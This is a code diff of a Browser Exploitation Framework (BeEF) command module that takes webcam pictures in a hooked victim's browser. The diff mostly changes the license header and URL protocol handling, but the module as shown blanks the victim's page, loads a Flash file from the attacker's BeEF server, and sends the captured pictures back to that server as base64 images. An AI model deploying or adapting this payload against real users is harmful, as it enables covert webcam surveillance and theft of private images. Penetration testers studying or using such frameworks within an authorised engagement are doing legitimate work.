@@ -1,18 +1,9 @@
 //
-//   Copyright 2012 Wade Alcorn wade@bindshell.net
+// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
 //
-//   Licensed under the Apache License, Version 2.0 (the "License");
-//   you may not use this file except in compliance with the License.
-//   You may obtain a copy of the License at
-//
-//       http://www.apache.org/licenses/LICENSE-2.0
-//
-//   Unless required by applicable law or agreed to in writing, software
-//   distributed under the License is distributed on an "AS IS" BASIS,
-//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-//   See the License for the specific language governing permissions and
-//   limitations under the License.
-//
+
 
 
 beef.execute(function() {
@@ -31,7 +22,7 @@ beef.execute(function() {
     
     
     //These 4 function names [noCamera(), noCamera(), pressedDisallow(), pictureCallback(picture), allPicturesTaken()] are hard coded in the swf actionscript3. Flash will invoke these functions directly. The picture for the pictureCallback function will be a base64 encoded JPG string
-    var js_functions = '<script>function noCamera() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=The user has no camera"); }; function pressedAllow() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=User pressed allow, you should get pictures soon"); }; function pressedDisallow() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=User pressed disallow, you won\'t get pictures"); }; function pictureCallback(picture) { beef.net.send("<%= @command_url %>", <%= @command_id %>, "picture="+picture); }; function allPicturesTaken(){  }';
+    var js_functions = '<script>function noCamera() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=The user has no camera"); }; function pressedAllow() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=User pressed allow, you should get pictures soon"); }; function pressedDisallow() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=User pressed disallow, you won\'t get pictures"); }; function pictureCallback(picture) { beef.net.send("<%= @command_url %>", <%= @command_id %>, "image="+picture); }; function allPicturesTaken(){  }';
     
     //This function is called by swfobject, if if fails to add the flash file to the page
     
@@ -52,10 +43,10 @@ beef.execute(function() {
     theHead.appendChild(style);
     
     //A nice library that helps us to include the swf file
-    var swfobject_script = '<script type="text/javascript" src="http://'+beef.net.host+':'+beef.net.port+'/swfobject.js"></script>'
+    var swfobject_script = '<script type="text/javascript" src="'+beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/swfobject.js"></script>'
     
     //This is the javascript that actually calls the swfobject library to include the swf file 
-    var include_script = '<script>var flashvars = {\'no_of_pictures\':\'<%= @no_of_pictures %>\', \'interval\':\'<%= @interval %>\'}; var parameters = {}; parameters.scale = "noscale"; parameters.wmode = "opaque"; parameters.allowFullScreen = "true"; parameters.allowScriptAccess = "always"; var attributes = {}; swfobject.embedSWF("http://'+beef.net.host+':'+beef.net.port+'/takeit.swf", "main", "403", "345", "9", "expressInstall.swf", flashvars, parameters, attributes, swfobjectCallback);</script>';
+    var include_script = '<script>var flashvars = {\'no_of_pictures\':\'<%= @no_of_pictures %>\', \'interval\':\'<%= @interval %>\'}; var parameters = {}; parameters.scale = "noscale"; parameters.wmode = "opaque"; parameters.allowFullScreen = "true"; parameters.allowScriptAccess = "always"; var attributes = {}; swfobject.embedSWF("'+beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/takeit.swf", "main", "403", "345", "9", "expressInstall.swf", flashvars, parameters, attributes, swfobjectCallback);</script>';
     
     //Empty body first
     $j('body').html('');
